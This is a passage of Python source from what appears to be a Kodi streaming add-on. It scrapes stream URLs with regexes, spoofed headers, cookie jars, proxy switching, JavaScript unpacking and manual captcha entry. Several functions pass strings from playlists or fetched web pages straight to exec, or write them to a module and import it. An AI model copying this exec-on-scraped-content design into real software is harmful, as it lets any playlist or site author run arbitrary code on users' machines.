                        complete_path=os.path.join(profile,cookie_jar_file)
#                        print 'complete_path',complete_path
                        saveCookieJar(cookieJar,cookie_jar_file)
                if  m['page'] and '$doregex' in m['page']:
                    pg=getRegexParsed(regexs, m['page'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
                    if len(pg)==0:
                        pg='http://regexfailed'
                    m['page']=pg

                if 'setcookie' in m and m['setcookie'] and '$doregex' in m['setcookie']:
                    m['setcookie']=getRegexParsed(regexs, m['setcookie'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
                if 'appendcookie' in m and m['appendcookie'] and '$doregex' in m['appendcookie']:
                    m['appendcookie']=getRegexParsed(regexs, m['appendcookie'],cookieJar,recursiveCall=True,cachedPages=cachedPages)


                if  'post' in m and '$doregex' in m['post']:
                    m['post']=getRegexParsed(regexs, m['post'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
#                    print 'post is now',m['post']

                if  'rawpost' in m and '$doregex' in m['rawpost']:
                    m['rawpost']=getRegexParsed(regexs, m['rawpost'],cookieJar,recursiveCall=True,cachedPages=cachedPages,rawPost=True)
                    #print 'rawpost is now',m['rawpost']

                if 'rawpost' in m and '$epoctime$' in m['rawpost']:
                    m['rawpost']=m['rawpost'].replace('$epoctime$',getEpocTime())

                if 'rawpost' in m and '$epoctime2$' in m['rawpost']:
                    m['rawpost']=m['rawpost'].replace('$epoctime2$',getEpocTime2())


                link=''
                if m['page'] and m['page'] in cachedPages and not 'ignorecache' in m and forCookieJarOnly==False :
                    #print 'using cache page',m['page']
                    link = cachedPages[m['page']]
                else:
                    if m['page'] and  not m['page']=='' and  m['page'].startswith('http'):
                        if '$epoctime$' in m['page']:
                            m['page']=m['page'].replace('$epoctime$',getEpocTime())
                        if '$epoctime2$' in m['page']:
                            m['page']=m['page'].replace('$epoctime2$',getEpocTime2())

                        #print 'Ingoring Cache',m['page']
                        page_split=m['page'].split('|')
                        pageUrl=page_split[0]
                        header_in_page=None
                        if len(page_split)>1:
                            header_in_page=page_split[1]

#                            if 
#                            proxy = urllib2.ProxyHandler({ ('https' ? proxytouse[:5]=="https":"http") : proxytouse})
#                            opener = urllib2.build_opener(proxy)
#                            urllib2.install_opener(opener)

                            
                        
#                        import urllib2
#                        print 'urllib2.getproxies',urllib2.getproxies()
                        current_proxies=urllib2.ProxyHandler(urllib2.getproxies())
        
        
                        #print 'getting pageUrl',pageUrl
                        req = urllib2.Request(pageUrl)
                        if 'proxy' in m:
                            proxytouse= m['proxy']
#                            print 'proxytouse',proxytouse
#                            urllib2.getproxies= lambda: {}
                            if pageUrl[:5]=="https":
                                proxy = urllib2.ProxyHandler({ 'https' : proxytouse})
                                #req.set_proxy(proxytouse, 'https')
                            else:
                                proxy = urllib2.ProxyHandler({ 'http'  : proxytouse})
                                #req.set_proxy(proxytouse, 'http')
                            opener = urllib2.build_opener(proxy)
                            urllib2.install_opener(opener)
                            
                        
                        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1')
                        proxytouse=None

                        if 'referer' in m:
                            req.add_header('Referer', m['referer'])
                        if 'accept' in m:
                            req.add_header('Accept', m['accept'])
                        if 'agent' in m:
                            req.add_header('User-agent', m['agent'])
                        if 'x-req' in m:
                            req.add_header('X-Requested-With', m['x-req'])
                        if 'x-addr' in m:
                            req.add_header('x-addr', m['x-addr'])
                        if 'x-forward' in m:
                            req.add_header('X-Forwarded-For', m['x-forward'])
                        if 'setcookie' in m:
#                            print 'adding cookie',m['setcookie']
                            req.add_header('Cookie', m['setcookie'])
                        if 'appendcookie' in m:
#                            print 'appending cookie to cookiejar',m['appendcookie']
                            cookiestoApend=m['appendcookie']
                            cookiestoApend=cookiestoApend.split(';')
                            for h in cookiestoApend:
                                n,v=h.split('=')
                                w,n= n.split(':')
                                ck = cookielib.Cookie(version=0, name=n, value=v, port=None, port_specified=False, domain=w, domain_specified=False, domain_initial_dot=False, path='/', path_specified=True, secure=False, expires=None, discard=True, comment=None, comment_url=None, rest={'HttpOnly': None}, rfc2109=False)
                                cookieJar.set_cookie(ck)
                        if 'origin' in m:
                            req.add_header('Origin', m['origin'])
                        if header_in_page:
                            header_in_page=header_in_page.split('&')
                            for h in header_in_page:
                                n,v=h.split('=')
                                req.add_header(n,v)
                        
                        if not cookieJar==None:
#                            print 'cookieJarVal',cookieJar
                            cookie_handler = urllib2.HTTPCookieProcessor(cookieJar)
                            opener = urllib2.build_opener(cookie_handler, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
                            opener = urllib2.install_opener(opener)
#                            print 'noredirect','noredirect' in m
                            
                            if 'noredirect' in m:
                                opener = urllib2.build_opener(cookie_handler,NoRedirection, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
                                opener = urllib2.install_opener(opener)
                        elif 'noredirect' in m:
                            opener = urllib2.build_opener(NoRedirection, urllib2.HTTPBasicAuthHandler(), urllib2.HTTPHandler())
                            opener = urllib2.install_opener(opener)
                            

                        if 'connection' in m:
#                            print '..........................connection//////.',m['connection']
                            from keepalive import HTTPHandler
                            keepalive_handler = HTTPHandler()
                            opener = urllib2.build_opener(keepalive_handler)
                            urllib2.install_opener(opener)


                        #print 'after cookie jar'
                        post=None

                        if 'post' in m:
                            postData=m['post']
                            #if '$LiveStreamRecaptcha' in postData:
                            #    (captcha_challenge,catpcha_word,idfield)=processRecaptcha(m['page'],cookieJar)
                            #    if captcha_challenge:
                            #        postData=postData.replace('$LiveStreamRecaptcha','manual_recaptcha_challenge_field:'+captcha_challenge+',recaptcha_response_field:'+catpcha_word+',id:'+idfield)
                            splitpost=postData.split(',');
                            post={}
                            for p in splitpost:
                                n=p.split(':')[0];
                                v=p.split(':')[1];
                                post[n]=v
                            post = urllib.urlencode(post)

                        if 'rawpost' in m:
                            post=m['rawpost']
                            #if '$LiveStreamRecaptcha' in post:
                            #    (captcha_challenge,catpcha_word,idfield)=processRecaptcha(m['page'],cookieJar)
                            #    if captcha_challenge:
                            #       post=post.replace('$LiveStreamRecaptcha','&manual_recaptcha_challenge_field='+captcha_challenge+'&recaptcha_response_field='+catpcha_word+'&id='+idfield)
                        link=''
                        try:
                            
                            if post:
                                response = urllib2.urlopen(req,post)
                            else:
                                response = urllib2.urlopen(req)
                            if response.info().get('Content-Encoding') == 'gzip':
                                from StringIO import StringIO
                                import gzip
                                buf = StringIO( response.read())
                                f = gzip.GzipFile(fileobj=buf)
                                link = f.read()
                            else:
                                link=response.read()
                            
                        
                        
                            if 'proxy' in m and not current_proxies is None:
                                urllib2.install_opener(urllib2.build_opener(current_proxies))
                            
                            link=javascriptUnEscape(link)
                            #print repr(link)
                            #print link This just print whole webpage in LOG
                            if 'includeheaders' in m:
                                #link+=str(response.headers.get('Set-Cookie'))
                                link+='$$HEADERS_START$$:'
                                for b in response.headers:
                                    link+= b+':'+response.headers.get(b)+'\n'
                                link+='$$HEADERS_END$$:'
    #                        print link
                            addon_log(link)
                            addon_log(cookieJar )

                            response.close()
                        except: 
                            pass
                        cachedPages[m['page']] = link
                        #print link
                        #print 'store link for',m['page'],forCookieJarOnly

                        if forCookieJarOnly:
                            return cookieJar# do nothing
                    elif m['page'] and  not m['page'].startswith('http'):
                        if m['page'].startswith('$pyFunction:'):
                            val=doEval(m['page'].split('$pyFunction:')[1],'',cookieJar,m )
                            if forCookieJarOnly:
                                return cookieJar# do nothing
                            link=val
                            link=javascriptUnEscape(link)
                        else:
                            link=m['page']
                if '$pyFunction:playmedia(' in m['expres'] or 'ActivateWindow'  in m['expres']  or '$PLAYERPROXY$=' in url  or  any(x in url for x in g_ignoreSetResolved):
                    setresolved=False
                if  '$doregex' in m['expres']:
                    m['expres']=getRegexParsed(regexs, m['expres'],cookieJar,recursiveCall=True,cachedPages=cachedPages)
                if not m['expres']=='':
                    #print 'doing it ',m['expres']
                    if '$LiveStreamCaptcha' in m['expres']:
                        val=askCaptcha(m,link,cookieJar)
                        #print 'url and val',url,val
                        url = url.replace("$doregex[" + k + "]", val)

                    elif m['expres'].startswith('$pyFunction:') or '#$pyFunction' in m['expres']:
                        #print 'expeeeeeeeeeeeeeeeeeee',m['expres']
                        val=''
                        if m['expres'].startswith('$pyFunction:'):
                            val=doEval(m['expres'].split('$pyFunction:')[1],link,cookieJar,m)
                        else:
                            val=doEvalFunction(m['expres'],link,cookieJar,m)
                        if 'ActivateWindow' in m['expres']: return
#                        print 'url k val',url,k,val
                        #print 'repr',repr(val)
                        
                        try:
                            url = url.replace(u"$doregex[" + k + "]", val)
                        except: url = url.replace("$doregex[" + k + "]", val.decode("utf-8"))
                    else:
                        if 'listrepeat' in m:
                            listrepeat=m['listrepeat']
                            ret=re.findall(m['expres'],link)
                            return listrepeat,ret, m,regexs
                             
                        val=''
                        if not link=='':
                            #print 'link',link
                            reg = re.compile(m['expres']).search(link)                            
                            try:
                                val=reg.group(1).strip()
                            except: traceback.print_exc()
                            if m['page']=='':
                                val=m['expres']
                            
                        if rawPost:
#                            print 'rawpost'
                            val=urllib.quote_plus(val)
                        if 'htmlunescape' in m:
                            #val=urllib.unquote_plus(val)
                            import HTMLParser
                            val=HTMLParser.HTMLParser().unescape(val)
                        try:
                            url = url.replace("$doregex[" + k + "]", val)
                        except: url = url.replace("$doregex[" + k + "]", val.decode("utf-8"))
                        #print 'ur',url
                        #return val
                else:
                    url = url.replace("$doregex[" + k + "]",'')
        if '$epoctime$' in url:
            url=url.replace('$epoctime$',getEpocTime())
        if '$epoctime2$' in url:
            url=url.replace('$epoctime2$',getEpocTime2())

        if '$GUID$' in url:
            import uuid
            url=url.replace('$GUID$',str(uuid.uuid1()).upper())
        if '$get_cookies$' in url:
            url=url.replace('$get_cookies$',getCookiesString(cookieJar))

        if recursiveCall: return url
        #print 'final url',repr(url)
        if url=="":
            return
        else:
            return url,setresolved


def getmd5(t):
    import hashlib
    h=hashlib.md5()
    h.update(t)
    return h.hexdigest()


def decrypt_vaughnlive(encrypted):
    retVal=""
#    print 'enc',encrypted
    #for val in encrypted.split(':'):
    #    retVal+=chr(int(val.replace("0m0","")))
    #return retVal


def playmedia(media_url):
    try:
        import  CustomPlayer
        player = CustomPlayer.MyXBMCPlayer()
        listitem = xbmcgui.ListItem( label = str(name), iconImage = "DefaultVideo.png", thumbnailImage = xbmc.getInfoImage( "ListItem.Thumb" ), path=media_url )
        player.play( media_url,listitem)
        xbmc.sleep(1000)
        while player.is_active:
            xbmc.sleep(200)
    except:
        traceback.print_exc()
    return ''


def kodiJsonRequest(params):
    data = json.dumps(params)
    request = xbmc.executeJSONRPC(data)

    try:
        response = json.loads(request)
    except UnicodeDecodeError:
        response = json.loads(request.decode('utf-8', 'ignore'))

    try:
        if 'result' in response:
            return response['result']
        return None
    except KeyError:
        logger.warn("[%s] %s" % (params['method'], response['error']['message']))
        return None


def setKodiProxy(proxysettings=None):

    if proxysettings==None:
#        print 'proxy set to nothing'
        xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.usehttpproxy", "value":false}, "id":1}')
    else:
        
        ps=proxysettings.split(':')
        proxyURL=ps[0]
        proxyPort=ps[1]
        proxyType=ps[2]
        proxyUsername=None
        proxyPassword=None
        
        if len(ps)>3 and '@' in ps[3]: #jairox ###proxysettings
            proxyUsername=ps[3].split('@')[0] #jairox ###ps[3]
            proxyPassword=ps[3].split('@')[1] #jairox ###proxysettings.split('@')[-1]

#        print 'proxy set to', proxyType, proxyURL,proxyPort
        xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.usehttpproxy", "value":true}, "id":1}')
        xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxytype", "value":' + str(proxyType) +'}, "id":1}')
        xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxyserver", "value":"' + str(proxyURL) +'"}, "id":1}')
        xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxyport", "value":' + str(proxyPort) +'}, "id":1}')
        
        
        if not proxyUsername==None:
            xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxyusername", "value":"' + str(proxyUsername) +'"}, "id":1}')
            xbmc.executeJSONRPC('{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxypassword", "value":"' + str(proxyPassword) +'"}, "id":1}')

        
def getConfiguredProxy():
    proxyActive = kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.usehttpproxy"}, 'id': 1})['value']
#    print 'proxyActive',proxyActive
    proxyType = kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.httpproxytype"}, 'id': 1})['value']

    if proxyActive: # PROXY_HTTP
        proxyURL = kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.httpproxyserver"}, 'id': 1})['value']
        proxyPort = unicode(kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.httpproxyport"}, 'id': 1})['value'])
        proxyUsername = kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.httpproxyusername"}, 'id': 1})['value']
        proxyPassword = kodiJsonRequest({'jsonrpc': '2.0', "method":"Settings.GetSettingValue", "params":{"setting":"network.httpproxypassword"}, 'id': 1})['value']

        if proxyUsername and proxyPassword and proxyURL and proxyPort:
            return proxyURL + ':' + str(proxyPort)+':'+str(proxyType) + ':' + proxyUsername + '@' + proxyPassword
        elif proxyURL and proxyPort:
            return proxyURL + ':' + str(proxyPort)+':'+str(proxyType)
    else:
        return None
        

def playmediawithproxy(media_url, name, iconImage,proxyip,port, proxyuser=None, proxypass=None): #jairox

    progress = xbmcgui.DialogProgress()
    progress.create('Progress', 'Playing with custom proxy')
    progress.update( 10, "", "setting proxy..", "" )
    proxyset=False
    existing_proxy=''
    #print 'playmediawithproxy'
    try:
        
        existing_proxy=getConfiguredProxy()
        print 'existing_proxy',existing_proxy
        #read and set here
        #jairox
        if not proxyuser == None:
            setKodiProxy( proxyip + ':' + port + ':0:' + proxyuser + '@' + proxypass)
        else:
            setKodiProxy( proxyip + ':' + port + ':0')

        #print 'proxy setting complete', getConfiguredProxy()
        proxyset=True
        progress.update( 80, "", "setting proxy complete, now playing", "" )
        
        progress.close()
        progress=None
        import  CustomPlayer
        player = CustomPlayer.MyXBMCPlayer()
        listitem = xbmcgui.ListItem( label = str(name), iconImage = iconImage, thumbnailImage = xbmc.getInfoImage( "ListItem.Thumb" ), path=media_url )
        player.play( media_url,listitem)
        xbmc.sleep(1000)
        while player.is_active:
            xbmc.sleep(200)
    except:
        traceback.print_exc()
    if progress:
        progress.close()
    if proxyset:
#        print 'now resetting the proxy back'
        setKodiProxy(existing_proxy)
#        print 'reset here'
    return ''


def get_saw_rtmp(page_value, referer=None):
    if referer:
        referer=[('Referer',referer)]
    if page_value.startswith("http"):
        page_url=page_value
        page_value= getUrl(page_value,headers=referer)

    str_pattern="(eval\(function\(p,a,c,k,e,(?:r|d).*)"

    reg_res=re.compile(str_pattern).findall(page_value)
    r=""
    if reg_res and len(reg_res)>0:
        for v in reg_res:
            r1=get_unpacked(v)
            r2=re_me(r1,'\'(.*?)\'')
            if 'unescape' in r1:
                r1=urllib.unquote(r2)
            r+=r1+'\n'
#        print 'final value is ',r

        page_url=re_me(r,'src="(.*?)"')

        page_value= getUrl(page_url,headers=referer)

    #print page_value

    rtmp=re_me(page_value,'streamer\'.*?\'(.*?)\'\)')
    playpath=re_me(page_value,'file\',\s\'(.*?)\'')


    return rtmp+' playpath='+playpath +' pageUrl='+page_url


def get_leton_rtmp(page_value, referer=None):
    if referer:
        referer=[('Referer',referer)]
    if page_value.startswith("http"):
        page_value= getUrl(page_value,headers=referer)
    str_pattern="var a = (.*?);\s*var b = (.*?);\s*var c = (.*?);\s*var d = (.*?);\s*var f = (.*?);\s*var v_part = '(.*?)';"
    reg_res=re.compile(str_pattern).findall(page_value)[0]

    a,b,c,d,f,v=(reg_res)
    f=int(f)
    a=int(a)/f
    b=int(b)/f
    c=int(c)/f
    d=int(d)/f

    ret= 'rtmp://' + str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d) + v;
    return ret


def createM3uForDash(url,useragent=None):
    str='#EXTM3U'
    str+='\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=361816'
    str+='\n'+url+'&bytes=0-200000'#+'|User-Agent='+useragent
    source_file = os.path.join(profile, 'testfile.m3u')
    str+='\n'
    SaveToFile(source_file,str)
    #return 'C:/Users/shani/Downloads/test.m3u8'
    return source_file


def SaveToFile(file_name,page_data,append=False):
    if append:
        f = open(file_name, 'a')
        f.write(page_data)
        f.close()
    else:
        f=open(file_name,'wb')
        f.write(page_data)
        f.close()
        return ''


def LoadFile(file_name):
    f=open(file_name,'rb')
    d=f.read()
    f.close()
    return d


def get_packed_iphonetv_url(page_data):
    import re,base64,urllib;
    s=page_data
    while 'geh(' in s:
        if s.startswith('lol('): s=s[5:-1]
#       print 's is ',s
        s=re.compile('"(.*?)"').findall(s)[0];
        s=  base64.b64decode(s);
        s=urllib.unquote(s);
    print s
    return s


def get_ferrari_url(page_data):
#    print 'get_dag_url2',page_data
    page_data2=getUrl(page_data);
    patt='(http.*)'
    import uuid
    playback=str(uuid.uuid1()).upper()
    links=re.compile(patt).findall(page_data2)
    headers=[('X-Playback-Session-Id',playback)]
    for l in links:
        try:
                page_datatemp=getUrl(l,headers=headers);

        except: pass

    return page_data+'|&X-Playback-Session-Id='+playback


def get_dag_url(page_data):
#    print 'get_dag_url',page_data
    if page_data.startswith('http://dag.total-stream.net'):
        headers=[('User-Agent','Verismo-BlackUI_(2.4.7.5.8.0.34)')]
        page_data=getUrl(page_data,headers=headers);

    if '127.0.0.1' in page_data:
        return revist_dag(page_data)
    elif re_me(page_data, 'wmsAuthSign%3D([^%&]+)') != '':
        final_url = re_me(page_data, '&ver_t=([^&]+)&') + '?wmsAuthSign=' + re_me(page_data, 'wmsAuthSign%3D([^%&]+)') + '==/mp4:' + re_me(page_data, '\\?y=([^&]+)&')
    else:
        final_url = re_me(page_data, 'href="([^"]+)"[^"]+$')
        if len(final_url)==0:
            final_url=page_data
    final_url = final_url.replace(' ', '%20')
    return final_url


def re_me(data, re_patten):
    match = ''
    m = re.search(re_patten, data)
    if m != None:
        match = m.group(1)
    else:
        match = ''
    return match


def revist_dag(page_data):
    final_url = ''
    if '127.0.0.1' in page_data:
        final_url = re_me(page_data, '&ver_t=([^&]+)&') + ' live=true timeout=15 playpath=' + re_me(page_data, '\\?y=([a-zA-Z0-9-_\\.@]+)')

    if re_me(page_data, 'token=([^&]+)&') != '':
        final_url = final_url + '?token=' + re_me(page_data, 'token=([^&]+)&')
    elif re_me(page_data, 'wmsAuthSign%3D([^%&]+)') != '':
        final_url = re_me(page_data, '&ver_t=([^&]+)&') + '?wmsAuthSign=' + re_me(page_data, 'wmsAuthSign%3D([^%&]+)') + '==/mp4:' + re_me(page_data, '\\?y=([^&]+)&')
    else:
        final_url = re_me(page_data, 'HREF="([^"]+)"')

    if 'dag1.asx' in final_url:
        return get_dag_url(final_url)

    if 'devinlivefs.fplive.net' not in final_url:
        final_url = final_url.replace('devinlive', 'flive')
    if 'permlivefs.fplive.net' not in final_url:
        final_url = final_url.replace('permlive', 'flive')
    return final_url


def get_unwise( str_eval):
    page_value=""
    try:
        ss="w,i,s,e=("+str_eval+')'
        exec (ss)
        page_value=unwise_func(w,i,s,e)
    except: traceback.print_exc(file=sys.stdout)
    #print 'unpacked',page_value
    return page_value


def unwise_func( w, i, s, e):
    lIll = 0;
    ll1I = 0;
    Il1l = 0;
    ll1l = [];
    l1lI = [];
    while True:
        if (lIll < 5):
            l1lI.append(w[lIll])
        elif (lIll < len(w)):
            ll1l.append(w[lIll]);
        lIll+=1;
        if (ll1I < 5):
            l1lI.append(i[ll1I])
        elif (ll1I < len(i)):
            ll1l.append(i[ll1I])
        ll1I+=1;
        if (Il1l < 5):
            l1lI.append(s[Il1l])
        elif (Il1l < len(s)):
            ll1l.append(s[Il1l]);
        Il1l+=1;
        if (len(w) + len(i) + len(s) + len(e) == len(ll1l) + len(l1lI) + len(e)):
            break;

    lI1l = ''.join(ll1l)#.join('');
    I1lI = ''.join(l1lI)#.join('');
    ll1I = 0;
    l1ll = [];
    for lIll in range(0,len(ll1l),2):
        #print 'array i',lIll,len(ll1l)
        ll11 = -1;
        if ( ord(I1lI[ll1I]) % 2):
            ll11 = 1;
        #print 'val is ', lI1l[lIll: lIll+2]
        l1ll.append(chr(    int(lI1l[lIll: lIll+2], 36) - ll11));
        ll1I+=1;
        if (ll1I >= len(l1lI)):
            ll1I = 0;
    ret=''.join(l1ll)
    if 'eval(function(w,i,s,e)' in ret:
#        print 'STILL GOing'
        ret=re.compile('eval\(function\(w,i,s,e\).*}\((.*?)\)').findall(ret)[0]
        return get_unwise(ret)
    else:
#        print 'FINISHED'
        return ret


def get_unpacked( page_value, regex_for_text='', iterations=1, total_iteration=1):
    try:
        reg_data=None
        if page_value.startswith("http"):
            page_value= getUrl(page_value)
#        print 'page_value',page_value
        if regex_for_text and len(regex_for_text)>0:
            try:
                page_value=re.compile(regex_for_text).findall(page_value)[0] #get the js variable
            except: return 'NOTPACKED'

        page_value=unpack(page_value,iterations,total_iteration)
    except:
        page_value='UNPACKEDFAILED'
        traceback.print_exc(file=sys.stdout)
#    print 'unpacked',page_value
    if 'sav1live.tv' in page_value:
        page_value=page_value.replace('sav1live.tv','sawlive.tv') #quick fix some bug somewhere
#        print 'sav1 unpacked',page_value
    return page_value


def unpack(sJavascript,iteration=1, totaliterations=2  ):
#    print 'iteration',iteration
    if sJavascript.startswith('var _0xcb8a='):
        aSplit=sJavascript.split('var _0xcb8a=')
        ss="myarray="+aSplit[1].split("eval(")[0]
        exec(ss)
        a1=62
        c1=int(aSplit[1].split(",62,")[1].split(',')[0])
        p1=myarray[0]
        k1=myarray[3]
        with open('temp file'+str(iteration)+'.js', "wb") as filewriter:
            filewriter.write(str(k1))
        #aa=1/0
    else:

        if "rn p}('" in sJavascript:
            aSplit = sJavascript.split("rn p}('")
        else:
            aSplit = sJavascript.split("rn A}('")
#        print aSplit

        p1,a1,c1,k1=('','0','0','')

        ss="p1,a1,c1,k1=('"+aSplit[1].split(".spli")[0]+')'
        exec(ss)
    k1=k1.split('|')
    aSplit = aSplit[1].split("))'")
#    print ' p array is ',len(aSplit)
#   print len(aSplit )

    #p=str(aSplit[0]+'))')#.replace("\\","")#.replace('\\\\','\\')

    #print aSplit[1]
    #aSplit = aSplit[1].split(",")
    #print aSplit[0]
    #a = int(aSplit[1])
    #c = int(aSplit[2])
    #k = aSplit[3].split(".")[0].replace("'", '').split('|')
    #a=int(a)
    #c=int(c)

    #p=p.replace('\\', '')
#    print 'p val is ',p[0:100],'............',p[-100:],len(p)
#    print 'p1 val is ',p1[0:100],'............',p1[-100:],len(p1)

    #print a,a1
    #print c,a1
    #print 'k val is ',k[-10:],len(k)
#    print 'k1 val is ',k1[-10:],len(k1)
    e = ''
    d = ''#32823

    #sUnpacked = str(__unpack(p, a, c, k, e, d))
    sUnpacked1 = str(__unpack(p1, a1, c1, k1, e, d,iteration))

    #print sUnpacked[:200]+'....'+sUnpacked[-100:], len(sUnpacked)
#    print sUnpacked1[:200]+'....'+sUnpacked1[-100:], len(sUnpacked1)

    #exec('sUnpacked1="'+sUnpacked1+'"')
    if iteration>=totaliterations:
#        print 'final res',sUnpacked1[:200]+'....'+sUnpacked1[-100:], len(sUnpacked1)
        return sUnpacked1#.replace('\\\\', '\\')
    else:
#        print 'final res for this iteration is',iteration
        return unpack(sUnpacked1,iteration+1)#.replace('\\', ''),iteration)#.replace('\\', '');#unpack(sUnpacked.replace('\\', ''))


def __unpack(p, a, c, k, e, d, iteration,v=1):

    #with open('before file'+str(iteration)+'.js', "wb") as filewriter:
    #    filewriter.write(str(p))
    while (c >= 1):
        c = c -1
        if (k[c]):
            aa=str(__itoaNew(c, a))
            if v==1:
                p=re.sub('\\b' + aa +'\\b', k[c], p)# THIS IS Bloody slow!
            else:
                p=findAndReplaceWord(p,aa,k[c])

            #p=findAndReplaceWord(p,aa,k[c])


    #with open('after file'+str(iteration)+'.js', "wb") as filewriter:
    #    filewriter.write(str(p))
    return p

#
#function equalavent to re.sub('\\b' + aa +'\\b', k[c], p)


def findAndReplaceWord(source_str, word_to_find,replace_with):
    splits=None
    splits=source_str.split(word_to_find)
    if len(splits)>1:
        new_string=[]
        current_index=0
        for current_split in splits:
            #print 'here',i
            new_string.append(current_split)
            val=word_to_find#by default assume it was wrong to split

            #if its first one and item is blank then check next item is valid or not
            if current_index==len(splits)-1:
                val='' # last one nothing to append normally
            else:
                if len(current_split)==0: #if blank check next one with current split value
                    if ( len(splits[current_index+1])==0 and word_to_find[0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_') or (len(splits[current_index+1])>0  and splits[current_index+1][0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_'):# first just just check next
                        val=replace_with
                #not blank, then check current endvalue and next first value
                else:
                    if (splits[current_index][-1].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_') and (( len(splits[current_index+1])==0 and word_to_find[0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_') or (len(splits[current_index+1])>0  and splits[current_index+1][0].lower() not in 'abcdefghijklmnopqrstuvwxyz1234567890_')):# first just just check next
                        val=replace_with

            new_string.append(val)
            current_index+=1
        #aaaa=1/0
        source_str=''.join(new_string)
    return source_str


def __itoa(num, radix):
#    print 'num red',num, radix
    result = ""
    if num==0: return '0'
    while num > 0:
        result = "0123456789abcdefghijklmnopqrstuvwxyz"[num % radix] + result
        num /= radix
    return result


def __itoaNew(cc, a):
    aa="" if cc < a else __itoaNew(int(cc / a),a)
    cc = (cc % a)
    bb=chr(cc + 29) if cc> 35 else str(__itoa(cc,36))
    return aa+bb


def getCookiesString(cookieJar):
    try:
        cookieString=""
        for index, cookie in enumerate(cookieJar):
            cookieString+=cookie.name + "=" + cookie.value +";"
    except: pass
    #print 'cookieString',cookieString
    return cookieString


def saveCookieJar(cookieJar,COOKIEFILE):
    try:
        complete_path=os.path.join(profile,COOKIEFILE)
        cookieJar.save(complete_path,ignore_discard=True)
    except: pass


def getCookieJar(COOKIEFILE):

    cookieJar=None
    if COOKIEFILE:
        try:
            complete_path=os.path.join(profile,COOKIEFILE)
            cookieJar = cookielib.LWPCookieJar()
            cookieJar.load(complete_path,ignore_discard=True)
        except:
            cookieJar=None

    if not cookieJar:
        cookieJar = cookielib.LWPCookieJar()

    return cookieJar


def doEval(fun_call,page_data,Cookie_Jar,m):
    ret_val=''
    #print fun_call
    if functions_dir not in sys.path:
        sys.path.append(functions_dir)

#    print fun_call
    try:
        py_file='import '+fun_call.split('.')[0]
#        print py_file,sys.path
        exec( py_file)
#        print 'done'
    except:
        #print 'error in import'
        traceback.print_exc(file=sys.stdout)
#    print 'ret_val='+fun_call
    exec ('ret_val='+fun_call)
#    print ret_val
    #exec('ret_val=1+1')
    try:
        return str(ret_val)
    except: return ret_val


def doEvalFunction(fun_call,page_data,Cookie_Jar,m):
#    print 'doEvalFunction'
    ret_val=''
    if functions_dir not in sys.path:
        sys.path.append(functions_dir)
    f=open(functions_dir+"/LSProdynamicCode.py","w")
    f.write(fun_call);
    f.close()
    import LSProdynamicCode
    ret_val=LSProdynamicCode.GetLSProData(page_data,Cookie_Jar,m)
    try:
        return str(ret_val)
    except: return ret_val


def getGoogleRecaptchaResponse(captchakey, cj,type=1): #1 for get, 2 for post, 3 for rawpost
#    #headers=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1')]
#    html_text=getUrl(url,noredir=True, cookieJar=cj,headers=headers)
 #   print 'html_text',html_text
    recapChallenge=""
    solution=""
#    cap_reg="recap.*?\?k=(.*?)\""    
#    match =re.findall(cap_reg, html_text)
    
        
#    print 'match',match
    captcha=False
    captcha_reload_response_chall=None
    solution=None
    if len(captchakey)>0: #new shiny captcha!
        captcha_url=captchakey
        if not captcha_url.startswith('http'):
            captcha_url='http://www.google.com/recaptcha/api/challenge?k='+captcha_url+'&ajax=1'
#        print 'captcha_url',captcha_url
        captcha=True

        cap_chall_reg='challenge.*?\'(.*?)\''
        cap_image_reg='\'(.*?)\''
        captcha_script=getUrl(captcha_url,cookieJar=cj)
        recapChallenge=re.findall(cap_chall_reg, captcha_script)[0]
        captcha_reload='http://www.google.com/recaptcha/api/reload?c=';
        captcha_k=captcha_url.split('k=')[1]
        captcha_reload+=recapChallenge+'&k='+captcha_k+'&reason=i&type=image&lang=en'
        captcha_reload_js=getUrl(captcha_reload,cookieJar=cj)
        captcha_reload_response_chall=re.findall(cap_image_reg, captcha_reload_js)[0]
        captcha_image_url='http://www.google.com/recaptcha/api/image?c='+captcha_reload_response_chall
        if not captcha_image_url.startswith("http"):
            captcha_image_url='http://www.google.com/recaptcha/api/'+captcha_image_url
        import random
        n=random.randrange(100,1000,5)
        local_captcha = os.path.join(profile,str(n) +"captcha.img" )
        localFile = open(local_captcha, "wb")
        localFile.write(getUrl(captcha_image_url,cookieJar=cj))
        localFile.close()
        solver = InputWindow(captcha=local_captcha)
        solution = solver.get()
        os.remove(local_captcha)

    if captcha_reload_response_chall:
        if type==1:
